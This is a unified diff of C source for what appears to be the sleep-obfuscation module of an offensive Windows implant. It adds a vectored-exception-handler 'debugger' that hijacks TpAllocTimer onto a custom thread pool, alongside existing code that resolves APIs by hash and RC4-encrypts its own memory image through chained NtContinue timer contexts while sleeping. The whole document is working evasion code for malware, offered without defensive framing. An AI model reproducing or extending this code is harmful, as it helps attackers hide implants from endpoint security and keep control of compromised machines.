@@ -10,6 +10,8 @@
 
 #include "Common.h"
 
+#if defined( _WIN64 )
+
 NTSTATUS
 NTAPI
 RtlCreateTimerQueue(
@@ -32,8 +34,14 @@ SystemFunction032(
 
 typedef struct
 {
+	D_API( CloseThreadpoolCleanupGroupMembers );
+	D_API( RtlRemoveVectoredExceptionHandler );
 	D_API( NtSignalAndWaitForSingleObject );
+	D_API( RtlAddVectoredExceptionHandler );
+	D_API( CreateThreadpoolCleanupGroup );
 	D_API( SetProcessValidCallTargets );
+	D_API( SetThreadpoolThreadMaximum );
+	D_API( SetThreadpoolThreadMinimum );
 	D_API( LdrGetProcedureAddress );
 	D_API( NtWaitForSingleObject );
 	D_API( RtlInitUnicodeString );
@@ -43,6 +51,8 @@ typedef struct
 	D_API( SystemFunction032 );
 	D_API( RtlCaptureContext );
 	D_API( RtlInitAnsiString );
+	D_API( CreateThreadpool );
+	D_API( CloseThreadpool );
 	D_API( RtlAllocateHeap );
 	D_API( VirtualProtect );
 	D_API( RtlCreateTimer );
@@ -56,6 +66,8 @@ typedef struct
 } API ;
 
 /* API Hashes */
+#define H_API_RTLREMOVEVECTOREDEXCEPTIONHANDLER	0xad1b018e /* RtlRemoveVectoredExceptionHandler */
+#define H_API_RTLADDVECTOREDEXCEPTIONHANDLER	0x2df06c89 /* RtlAddVectoredExceptionHandler */
 #define H_API_NTSIGNALANDWAITFORSINGLEOBJECT	0x78983aed /* NtSignalAndWaitForSingleObject */
 #define H_API_SETPROCESSVALIDCALLTARGETS	0x647d9236 /* SetProcessValidCallTargets */
 #define H_API_LDRGETPROCEDUREADDRESS		0xfce76bb6 /* LdrGetProcedureAddress */
@@ -79,6 +91,86 @@ typedef struct
 /* LIB Hashes */
 #define H_LIB_KERNELBASE			0x03ebb38b /* kernelbase.dll */
 #define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */
+
+/* STR Hashes */
+#define H_STR_TPALLOCTIMER			0x383d6995 /* TpAllocTimer */
+
+/*!
+ *
+ * Purpose:
+ *
+ * Modifies TpAllocTimer to use a custom thread pool. Inteded to
+ * act as a hook for the call RtlCreateTimer and redirected to
+ * with a VEH debugger.
+ *
+!*/
+D_SEC( D ) NTSTATUS NTAPI TpAllocTimerHook( _Out_ PTP_TIMER *Timer, _In_ PTP_TIMER_CALLBACK Callback, _Inout_opt_ PVOID Context, _In_opt_ PTP_CALLBACK_ENVIRON CallbackEnviron ) 
+{
+	PTABLE		Tbl = NULL;
+	NTSTATUS 	Ret = STATUS_SUCCESS;
+
+	/* Get a pointer to Table */
+	Tbl = C_PTR( G_SYM( Table ) );
+
+	/* Execute TpAllocTimer and swap CallbackEnviron with a replacement */
+	Ret = ( ( __typeof__( TpAllocTimerHook ) * ) PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) )(
+		Timer, Callback, Context, & Tbl->Table->Debugger.PoolEnv
+
+	);
+
+	/* Re-insert EFLAGS so that the hook can give back control */
+	__writeeflags( __readeflags() | 0x100 );
+
+	/* Return */
+	return Ret;
+};
+
+/*!
+ *
+ * Purpose:
+ *
+ * Simple VEH-based debugger that will attempt to redirect all
+ * calls to TpAllocWork to a hooked version which will insert
+ * our custom thread pool.
+ *
+!*/
+D_SEC( D ) LONG WINAPI VehDebugger( _In_ PEXCEPTION_POINTERS ExceptionIf )
+{
+	DWORD	Ret = 0;
+	PTABLE	Tbl = NULL;
+
+	Tbl = C_PTR( G_SYM( Table ) );
+
+	/* Is the thread where our debugger comes from ? */
+	if ( Tbl->Table->ClientId.UniqueThread == NtCurrentTeb()->ClientId.UniqueThread ) {
+		if ( ExceptionIf->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP ) {
+			if ( U_PTR( ExceptionIf->ExceptionRecord->ExceptionAddress ) == U_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREMOVEVECTOREDEXCEPTIONHANDLER ) ) ) 
+			{
+				/* Removes the trap flag from ELFAGS */
+				ExceptionIf->ContextRecord->EFlags = ExceptionIf->ContextRecord->EFlags &~ 0x100;
+			} else if ( U_PTR( ExceptionIf->ExceptionRecord->ExceptionAddress ) == U_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) ) 
+			{
+				/* Redirect TpAllocTimer -> TpAllocTimerHook. Removes EFLAGS, must restore manually */
+				ExceptionIf->ContextRecord->Rip = U_PTR( G_SYM( TpAllocTimerHook ) );
+
+				/* Removes the trap flag from EFLAGS */
+				ExceptionIf->ContextRecord->EFlags = ExceptionIf->ContextRecord->EFlags &~ 0x100;
+			} else
+			{
+				/* Re-insert the single step instruction! */
+				ExceptionIf->ContextRecord->EFlags |= 0x100;
+			};
+			/* Notify! */
+			Ret = EXCEPTION_CONTINUE_EXECUTION;
+		};
+
+		/* Return */
+		return Ret;
+	};
+
+	/* Pretty much ignore all other exceptions! */
+	return EXCEPTION_CONTINUE_SEARCH;
+};
 
 /*!
  *
@@ -135,35 +227,40 @@ D_SEC( D ) VOID CfgEnableFunc( _In_ PVOID ImageBase, _In_ PVOID Function )
 !*/
 D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 {
-	API		Api;
-	UCHAR		Rnd[ 16 ];
-	USTRING		Key;
-	USTRING		Buf;
-	CONTEXT		Ctx;
-	ANSI_STRING	Ani;
-	UNICODE_STRING	Uni;
+	API			Api;
+	UCHAR			Rnd[ 16 ];
+	USTRING			Key;
+	USTRING			Buf;
+	CONTEXT			Ctx;
+	ANSI_STRING		Ani;
+	UNICODE_STRING		Uni;
 
-	DWORD		Prt = 0;
-	DWORD		Del = 0;
-	SIZE_T		XLn = 0;
-	SIZE_T		FLn = 0;
+	DWORD			Prt = 0;
+	DWORD			Del = 0;
+	SIZE_T			XLn = 0;
+	SIZE_T			FLn = 0;
 
-	PVOID		Ev1 = NULL;
-	PVOID		Ev2 = NULL;
-	PVOID		Ev3 = NULL;
-	PVOID		K32 = NULL;
-	PVOID		Adv = NULL;
-	PVOID		Tmr = NULL;
-	PVOID		Que = NULL;
-	PVOID		Img = NULL;
-	PTABLE		Tbl = NULL;
-	PCONTEXT	Beg = NULL;
-	PCONTEXT	Set = NULL;
-	PCONTEXT	Enc = NULL;
-	PCONTEXT	Blk = NULL;
-	PCONTEXT	Dec = NULL;
-	PCONTEXT	Res = NULL;
-	PCONTEXT	End = NULL;
+	PVOID			Veh = NULL;
+	PVOID			Ev1 = NULL;
+	PVOID			Ev2 = NULL;
+	PVOID			Ev3 = NULL;
+	PVOID			K32 = NULL;
+	PVOID			Adv = NULL;
+	PVOID			Tmr = NULL;
+	PVOID			Que = NULL;
+	PVOID			Img = NULL;
+
+	PVOID			Cln = NULL;
+	PVOID			Pol = NULL;
+	
+	PTABLE			Tbl = NULL;
+	PCONTEXT		Beg = NULL;
+	PCONTEXT		Set = NULL;
+	PCONTEXT		Enc = NULL;
+	PCONTEXT		Blk = NULL;
+	PCONTEXT		Dec = NULL;
+	PCONTEXT		Res = NULL;
+	PCONTEXT		End = NULL;
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
@@ -174,22 +271,24 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
 	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
 
-	Api.NtSignalAndWaitForSingleObject = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSIGNALANDWAITFORSINGLEOBJECT );
-	Api.LdrGetProcedureAddress         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRGETPROCEDUREADDRESS );
-	Api.NtWaitForSingleObject          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
-	Api.RtlInitUnicodeString           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING ); 
-	Api.RtlCreateTimerQueue            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATETIMERQUEUE );
-	Api.RtlDeleteTimerQueue            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLDELETETIMERQUEUE );
-	Api.RtlCaptureContext              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCAPTURECONTEXT );
-	Api.RtlInitAnsiString              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITANSISTRING );
-	Api.RtlAllocateHeap                = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
-	Api.RtlCreateTimer                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATETIMER );
-	Api.NtCreateEvent                  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATEEVENT );
-	Api.LdrUnloadDll                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
-	Api.RtlFreeHeap                    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
-	Api.LdrLoadDll                     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );
-	Api.NtContinue                     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCONTINUE );
-	Api.NtClose                        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );
+	Api.RtlRemoveVectoredExceptionHandler = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREMOVEVECTOREDEXCEPTIONHANDLER ); 
+	Api.RtlAddVectoredExceptionHandler    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLADDVECTOREDEXCEPTIONHANDLER );
+	Api.NtSignalAndWaitForSingleObject    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSIGNALANDWAITFORSINGLEOBJECT );
+	Api.LdrGetProcedureAddress            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRGETPROCEDUREADDRESS );
+	Api.NtWaitForSingleObject             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
+	Api.RtlInitUnicodeString              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING ); 
+	Api.RtlCreateTimerQueue               = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATETIMERQUEUE );
+	Api.RtlDeleteTimerQueue               = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLDELETETIMERQUEUE );
+	Api.RtlCaptureContext                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCAPTURECONTEXT );
+	Api.RtlInitAnsiString                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITANSISTRING );
+	Api.RtlAllocateHeap                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
+	Api.RtlCreateTimer                    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATETIMER );
+	Api.NtCreateEvent                     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATEEVENT );
+	Api.LdrUnloadDll                      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
+	Api.RtlFreeHeap                       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
+	Api.LdrLoadDll                        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );
+	Api.NtContinue                        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCONTINUE );
+	Api.NtClose                           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );
 
 	/* Load kernel32.dll if it somehow isnt already! */
 	Api.RtlInitUnicodeString( &Uni, C_PTR( G_SYM( L"kernel32.dll" ) ) );
@@ -200,11 +299,29 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 
 		if ( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Uni, &Adv ) ) ) {
 
+			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "CloseThreadpoolCleanupGroupMembers" ) ) );
+			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.CloseThreadpoolCleanupGroupMembers );
+
+			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "CreateThreadpoolCleanupGroup" ) ) );
+			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.CreateThreadpoolCleanupGroup );
+
+			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "SetThreadpoolThreadMaximum" ) ) );
+			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.SetThreadpoolThreadMaximum );
+
+			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "SetThreadpoolThreadMinimum" ) ) );
+			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.SetThreadpoolThreadMinimum );
+
 			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "WaitForSingleObject" ) ) );
 			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.WaitForSingleObject );
 
 			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "SystemFunction032" ) ) );
 			Api.LdrGetProcedureAddress( Adv, &Ani, 0, &Api.SystemFunction032 );
+
+			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "CreateThreadpool" ) ) );
+			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.CreateThreadpool );
+
+			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "CloseThreadpool" ) ) );
+			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.CloseThreadpool );
 
 			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "VirtualProtect" ) ) );
 			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.VirtualProtect );
@@ -238,6 +355,34 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 					/* Abort! */
 					break;
 				};
+
+				/* Add an exception handler to handle hooking. */
+				if ( ! ( Veh = Api.RtlAddVectoredExceptionHandler( 1, C_PTR( G_SYM( VehDebugger ) ) ) ) ) {
+					/* Abort! */
+					break;
+				};
+
+				/* Initialize the thread pool environment */
+				InitializeThreadpoolEnvironment( &Tbl->Table->Debugger.PoolEnv );
+
+				if ( !( Pol = Api.CreateThreadpool( NULL ) ) ) {
+					/* Abort! */
+					break;
+				};
+
+				if ( !( Cln = Api.CreateThreadpoolCleanupGroup() ) ) {
+					/* Abort! */
+					break;
+				};
+
+				/* Initialize the 'pool' that the timer will use */
+				Api.SetThreadpoolThreadMaximum( Pol, 1 );
+				Api.SetThreadpoolThreadMinimum( Pol, 1 );
+				SetThreadpoolCallbackPool( & Tbl->Table->Debugger.PoolEnv, Pol );
+				SetThreadpoolCallbackCleanupGroup( & Tbl->Table->Debugger.PoolEnv, Cln, NULL );
+
+				/* Add trap flag to EFLAGS */
+				__writeeflags( __readeflags() | 0x100 );
 
 				if ( NT_SUCCESS( Api.RtlCreateTimerQueue( &Que ) ) ) {
 
@@ -277,7 +422,6 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 
 								CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.NtContinue );
 
-							#if defined( _WIN64 )
 								__builtin_memcpy( Beg, &Ctx, sizeof( CONTEXT ) );
 								Beg->ContextFlags = CONTEXT_FULL;
 								Beg->Rip  = U_PTR( Api.WaitForSingleObject );
@@ -329,7 +473,6 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 								End->Rip  = U_PTR( Api.SetEvent );
 								End->Rsp -= sizeof( PVOID );
 								End->Rcx  = U_PTR( Ev3 );
-							#endif
 
 								if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Beg, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
 								if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Set, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
@@ -339,8 +482,11 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 								if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Res, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
 								if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, End, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
 
-								/* Execute and await the frame results! */
-								Api.NtSignalAndWaitForSingleObject( Ev2, Ev3, FALSE, NULL ); 
+								/* Remove the Vectored Exception Handler! */
+								if ( Api.RtlRemoveVectoredExceptionHandler( Veh ) ) {
+									/* Execute and await the frame results! */
+									Api.NtSignalAndWaitForSingleObject( Ev2, Ev3, FALSE, NULL ); 
+								};
 							};
 						};
 					};
@@ -380,6 +526,18 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 			if ( End != NULL ) {
 				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, End );
 			};
+			if ( Veh != NULL ) {
+				/* Remove the Vectored Exception Handler */
+				Api.RtlRemoveVectoredExceptionHandler( Veh );
+			};
+			if ( Cln != NULL ) {
+				/* Close the thread pool cleanup */
+				Api.CloseThreadpoolCleanupGroupMembers( Cln, TRUE, NULL ); 
+			};
+			if ( Pol != NULL ) {
+				/* Close the pool */
+				Api.CloseThreadpool( Pol );
+			};
 
 			/* Dereference */
 			Api.LdrUnloadDll( Adv );
@@ -396,3 +554,5 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
 	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
 };
+
+#endif
